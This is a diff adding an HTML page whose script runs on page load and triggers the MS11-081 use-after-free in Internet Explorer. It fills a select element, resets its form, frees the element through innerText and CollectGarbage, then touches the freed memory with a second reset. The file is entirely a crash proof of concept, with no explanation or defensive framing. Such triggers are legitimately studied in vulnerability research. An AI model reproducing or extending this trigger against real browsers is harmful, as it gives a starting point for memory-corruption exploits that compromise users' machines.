@@ -1,0 +1,35 @@
+<html>
+<head>
+  <script>
+    function crash()
+    {
+      alert('MS11-081!!');  
+      var formobj, selobj, optobj;
+      selobj = document.getElementById("select1");
+      formobj = selobj.form;
+      for(var i=0;i<5;i++) {
+        optobj = document.createElement('option');
+        optobj.text = "test";
+        selobj.add(optobj);
+      }
+    
+      alert('Before Free');
+      formobj.reset();
+
+      selobj.innerText = "hyunmini";
+      CollectGarbage();
+      
+      alert('After Free');
+      formobj.reset();
+    }
+  </script>
+</head>
+
+<body onload='crash()'>
+ <form>
+  <select id="select1">
+  </select>
+ </form>
+</body>
+
+</html>
